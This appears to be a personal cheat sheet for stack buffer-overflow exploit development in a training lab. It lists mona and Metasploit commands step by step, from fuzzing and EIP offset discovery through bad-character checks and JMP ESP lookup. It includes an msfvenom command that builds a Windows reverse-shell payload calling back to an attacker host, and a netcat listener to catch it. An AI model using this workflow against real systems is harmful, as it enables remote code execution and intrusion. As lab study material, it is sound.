# Mona with Immunity Debugger

- Fuzz the binary to find the number of characters that crash the program.

Start the server (Running) in immunity and create a new workspace:

```sh
!mona config -set workingfolder c:\mona\%p
```

Create a pattern with metasploit to find the EIP offset

```sh
msf-pattern_create -l 2400 
# 2400 (which is the result from fuzzing.py script)
```

Find the exact EIP offset at the time of crash

```sh
!mona findmsp -distance 2400
# or 
msf-pattern_offset -q EIP_ADDRESS
```

Restart the server (Running) in immunity and search for badchars, we create a badchars array with mona

```sh
!mona bytearray -b "\x00"
```

We generate a badchars string that we add as a payload in the exploit script AND we execute it.

We compare the badchars with the ESP offset at the time of crash to find the badchars

```sh
!mona compare -f C:\mona\<workingfolder>\bytearray.bin -a <ESP offset>
```

We generate a shellcode with metasploit excluding the badchars

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER-IP> LPORT=4444 -b "<badchars>" -f py
```

Restart the server (Running) in immunity and find a jump offset on ESP with mona to execute the shellcode.

```sh
!mona jmp -r esp -cpb "<badchars>"
```

We update the retn offset in the exploit script and add NOPS (16 is good)

We start a netcat locally and exploit

```sh
rlwrap nc -nlvp 4444
```